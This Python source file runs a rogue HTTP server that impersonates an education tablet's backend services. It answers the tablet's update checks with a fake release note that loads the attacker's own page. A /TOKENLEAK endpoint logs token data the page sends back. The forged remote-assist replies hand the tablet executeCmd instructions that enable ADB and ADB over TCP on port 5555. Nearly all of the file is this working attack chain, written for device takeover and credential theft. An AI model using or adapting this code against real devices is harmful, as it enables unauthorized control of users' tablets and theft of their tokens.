# -*- coding: utf-8 -*-
"""判定实验探针 (8099): 记录每个请求来源, 并按类型给出可用响应。

判定: 若 probe8099.log 出现非 127.0.0.1 的来源(平板 " + _p200_ip() + ") => 端侧采纳了我们的微服务表。
覆盖响应:
  /api/v1/pub/distribution/apps/<pkg>/versions/<ver>/check -> ReleaseNote(指向我们的页面)
  /assists | /assists/<id>/tasks | /assist/result         -> 协助链(open-adb 载荷)
  /versionChange/                                          -> 资源码(自动协助)
  microServer / GetXsList                                  -> 表(SA106003 -> 8099)
"""
import datetime
import http.server
import json
import os
import socketserver
import threading

# === PAD-AUTODETECT (patch_pad_ip.py): 按 MAC 找平板当前 IP, 免受 DHCP 换址影响 ===
_PAD_MAC = "80:20:fd:8b:4b:fa"
_pad_cache = {"ip": None, "t": 0.0}


def _p200_ip():
    import time as _t
    import subprocess as _sp
    import re as _re
    now = _t.time()
    if _pad_cache["ip"] and now - _pad_cache["t"] < 15:
        return _pad_cache["ip"]
    want = _PAD_MAC.replace(":", "-").lower()
    try:
        out = _sp.check_output(["arp", "-a"], creationflags=0x08000000).decode("utf-8", "replace")
        for line in out.splitlines():
            if want in line.lower():
                m = _re.search(r"(192\.168\.137\.\d+)", line)
                if m:
                    _pad_cache["ip"] = m.group(1)
                    _pad_cache["t"] = now
                    return m.group(1)
    except Exception:
        pass
    _pad_cache["ip"] = _pad_cache["ip"] or "192.168.137.154"
    _pad_cache["t"] = now
    return _pad_cache["ip"]
# === /PAD-AUTODETECT ===


BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, "probe8099.log")
PORT = 8099
OUR_IP = "192.168.137.1"
REMOTE_ASSIST_CODE = "CA106002SB1030140001"

ASSIST_SESSION = {"id": "assist_marvis_0001", "teacherId": 1, "teacherName": "xuehai",
                  "status": 1, "createTime": 1692000000000}
ASSIST_TASKS = [
    {"id": "t8099_1", "step": 1,
     "instruction": 'executeCmd("id; getprop ro.product.model; echo PROBE8099_OK")'},
]
OPENADB_TASKS = [
    {"id": "oadb8099_0", "step": 1,
     "instruction": 'executeCmd("settings put global adb_enabled 1")'},
    {"id": "oadb8099_1", "step": 2,
     "instruction": 'executeCmd("settings put global development_settings_enabled 1")'},
    {"id": "oadb8099_2", "step": 3,
     "instruction": 'executeCmd("setprop service.adb.tcp.port 5555")'},
    {"id": "oadb8099_3", "step": 4,
     "instruction": 'executeCmd("setprop persist.sys.usb.config mtp,adb")'},
]

_lock = threading.Lock()


def log(line):
    with _lock:
        with open(LOG, "a", encoding="utf-8", errors="replace") as f:
            f.write("%s %s\n" % (datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), line))


def table_v1():
    return {"serverType": "SA106003", "updateTime": 4102444800000,
            "microServerDtoList": [
                {"serverType": "SA106003", "domainOrIp": "http://%s" % OUR_IP,
                 "port": PORT, "mode": 0, "index": 0, "dirLocation": "",
                 "schoolId": 0, "serverId": 1, "schList": []}]}


class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _json(self, obj):
        d = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(d)))
        self.end_headers()
        self.wfile.write(d)

    def _handle(self):
        try:
            n = int(self.headers.get("Content-Length") or 0)
        except Exception:
            n = 0
        body = self.rfile.read(n) if n else b""
        src = self.client_address[0]
        p = self.path
        log("[PROBE8099] src=%s %s %s | Host=%s | UA=%s | body=%dB"
            % (src, self.command, p[:220], self.headers.get("Host", ""),
               (self.headers.get("User-Agent") or "")[:70], len(body)))
        if src not in ("127.0.0.1", "::1"):
            log("!!!!!! [PROBE8099-HIT] \u975e\u672c\u673a\u6765\u6e90! src=%s %s %s"
                % (src, self.command, p[:200]))
            if body:
                log("        body=%s" % body[:400])
        try:
            # TOKENLEAK-8099: 页面回传桥数据
            if "/TOKENLEAK" in p:
                from urllib.parse import unquote
                _d = ""
                if "?d=" in p:
                    _d = unquote(p.split("?d=", 1)[1])
                log("!!!!!! [TOKENLEAK-8099] 页面回传: %s" % _d[:1200])
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", "2")
                self.end_headers()
                self.wfile.write(b"ok")
                return
            # NOTEHTML-8099: 更新弹窗加载的页面(直接可观测)
            if p.split("?")[0].endswith("/note.html"):
                _f = os.path.join(BASE, "note.html")
                try:
                    _b = open(_f, "rb").read()
                except Exception:
                    _b = b"<html><body>ok</body></html>"
                log("!!!!!! [NOTE-HTML-8099] 弹窗加载我们的页面 UA=%s"
                    % (self.headers.get("User-Agent") or "")[:80])
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(_b)))
                self.end_headers()
                self.wfile.write(_b)
                return
            if "/distribution/apps/" in p and p.rstrip("/").endswith("/check"):
                return self._json({"versionCode": 999999, "reminded": 0,
                                   "url": "http://%s:%d/note.html" % (OUR_IP, PORT)})
            if "/assist" in p:
                if "/tasks" in p or "task" in p.lower():
                    log("        -> \u4e0b\u53d1 open-adb \u4efb\u52a1")
                    return self._json(OPENADB_TASKS)
                if any(k in p for k in ("result", "active", "finish", "status", "complete")):
                    return self._json({})
                log("        -> \u4e0b\u53d1\u4f2a\u9020\u534f\u52a9\u4f1a\u8bdd")
                return self._json(ASSIST_SESSION)
            if "versionChange" in p.lower():
                log("        -> \u4e0b\u53d1 REMOTE_ASSIST_CODE")
                return self._json({"dataCodes": REMOTE_ASSIST_CODE,
                                   "intervalTime": 60000, "version": 2147483000})
            if "microServer" in p or "GetXsList" in p:
                return self._json(table_v1())
            return self._json({})
        except Exception as e:
            log("[PROBE8099-ERR] %s" % e)

    do_GET = _handle
    do_POST = _handle
    do_PUT = _handle

    def log_message(self, *a):
        pass


class S(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


if __name__ == "__main__":
    log("=== probe8099 \u542f\u52a8 (SA106003 -> %s:%d) ===" % (OUR_IP, PORT))
    with S(("0.0.0.0", PORT), H) as httpd:
        httpd.serve_forever()